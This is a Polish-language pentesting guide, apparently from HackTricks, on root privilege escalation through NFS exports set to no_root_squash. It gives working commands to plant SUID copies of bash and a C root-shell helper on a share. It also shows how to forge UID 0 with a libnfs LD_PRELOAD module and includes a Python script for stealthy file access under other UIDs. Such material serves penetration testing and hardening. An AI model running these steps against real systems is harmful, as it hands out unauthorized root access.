# Eskalacja uprawnień przez błędną konfigurację NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje o squashowaniu

W przypadku NFS AUTH_SYS/AUTH_UNIX serwer opiera kontrole uprawnień do plików na wartościach `uid` i `gid` przesyłanych w każdym żądaniu RPC. Inne mechanizmy bezpieczeństwa, takie jak Kerberos, używają innych poświadczeń, a serwer może mapować poświadczenia numeryczne przed sprawdzeniem uprawnień.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Mapuje każdy UID i GID na konto anonimowe, które domyślnie w Linuksie ma nazwę `nobody` (65534). `no_all_squash` jest ustawieniem domyślnym dla żądań innych niż root.<sup>[[4]](#references)</sup>
- **`root_squash`**: Jest to ustawienie domyślne w Linuksie. Mapuje żądania z UID/GID 0 (root) na konto anonimowe; pozostałe UID i GID nie są squashowane.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Wyłącza squashowanie roota, więc żądania z UID/GID 0 mogą być na serwerze traktowane jako żądania roota.<sup>[[4]](#references)</sup>

Jeśli dozwolony klient może zamontować zapisywalny export skonfigurowany w **`/etc/exports`** z opcją **`no_root_squash`**, jego żądania z UID/GID 0 mogą zapisywać dane jako użytkownik root serwera.<sup>[[4]](#references)</sup>

`root_squash` remapuje wyłącznie UID/GID 0; w przypadku AUTH_SYS **niezerowy numeryczny UID/GID** dozwolonego klienta może nadal odpowiadać innemu kontu na serwerze. Dlatego zapisywalny export może umożliwić dostęp między kontami nawet przy włączonym squashowaniu roota, jeśli klient może utworzyć plik z taką tożsamością numeryczną, a serwer zezwala na dostęp. W przypadku przekazania uprawnień SUID/SGID sprawdź też właściciela wynikowego pliku, dostęp do jego wykonania, stan `nosuid` na serwerze, ACL oraz SELinux lub inne zasady. Sama ścieżka exportu, opcja `rw` albo zgodność numerów nie dowodzi, że klient ma dostęp, export jest aktywny ani że oba hosty stosują to samo mapowanie tożsamości. Podczas enumeracji sprawdzaj pasywnie `/etc/exports` i lokalne metadane; nie montuj nowego udziału ani nie twórz pliku testowego.<sup>[[4]](#references)[[5]](#references)</sup>

Więcej informacji o **NFS** znajdziesz tutaj:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Eskalacja uprawnień

### Zdalny exploit

Opcja 1 z użyciem bash:
- Na dozwolonym kliencie zamontuj jako root zapisywalny export, skopiuj do niego **`/bin/bash`**, ustaw jego bit **SUID** i uruchom go z punktu montowania po stronie ofiary, który nie używa `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Aby przesłany plik zachował właściciela root, serwer musi używać **`no_root_squash`**. Jeśli root jest squashowany, plik binarny SUID dla innego konta jest możliwy tylko wtedy, gdy klient może zgodnie z uprawnieniami utworzyć go lub zostać jego właścicielem, używając numerycznego UID/GID tego konta.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Opcja 2 — użycie skompilowanego kodu C:
- Zamontuj katalog z dozwolonego klienta, skopiuj do niego skompilowany payload wykorzystujący uprawnienia SUID, ustaw jego bit **SUID** i uruchom go na ofierze (zobacz [payloady SUID w C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Obowiązują te same ograniczenia co wcześniej

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Lokalny exploit

> [!TIP]
> Pamiętaj, że jeśli możesz utworzyć **tunel ze swojego komputera do maszyny ofiary, nadal możesz użyć wersji zdalnej, aby wykorzystać tę eskalację uprawnień, tunelując wymagane porty**.\
> Poniższa sztuczka jest przydatna, gdy `/etc/exports` ogranicza eksport do adresu IP ofiary: zdalny klient nie może go zamontować, ale lokalna technika może działać za pośrednictwem udziału już zamontowanego na dozwolonym hoście.<sup>[[2]](#references)</sup>\
> W przypadku tej metody libnfs dla nieuprzywilejowanego użytkownika eksport w **`/etc/exports`** musi używać flagi `insecure`, aby proces mógł użyć niezarezerwowanego portu źródłowego; domyślnie używana jest opcja `secure`, ale proces, który może powiązać się z zarezerwowanym portem, nie potrzebuje tej opcji.<sup>[[1]](#references)[[4]](#references)</sup>

### Podstawowe informacje

Klient NFSv3 AUTH_UNIX dołącza swój efektywny UID, GID i grupy do każdego wywołania, a serwer używa ich do sprawdzania uprawnień. Ta lokalna technika wykorzystuje ten model, fałszując poświadczenia RPC za pomocą [libnfs](https://github.com/sahlberg/libnfs); jego moduł preload obsługuje nadpisywanie UID/GID w kontekście NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kompilowanie biblioteki

Przykład libnfs może wymagać dostosowania do docelowego jądra; w opisanym tu przewodniku zaznaczono, że przed skompilowaniem modułu preload należy zakomentować wywołania systemowe fallocate.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Przeprowadzenie Exploita

Przykład tworzy mały program pomocniczy w C, który uruchamia shell, a następnie umieszcza go w udziale i używa `ld_nfs.so` z UID 0 w kontekście NFS, aby nadać mu uprawnienia SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Skompiluj kod exploita:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Umieść exploit na udziale i zmień jego uprawnienia, podszywając się pod UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Uruchom exploit, aby uzyskać uprawnienia roota**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell do dyskretnego dostępu do plików

Po uzyskaniu dostępu root ten wzorzec `nfsh.py` ustawia efektywny UID na UID pliku docelowego przed uruchomieniem polecenia, umożliwiając dostęp bez rekurencyjnej zmiany właściciela.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Uruchom w następujący sposób:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Historia mniej znanego NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — strona podręcznika systemu Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: specyfikacja protokołu NFS w wersji 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
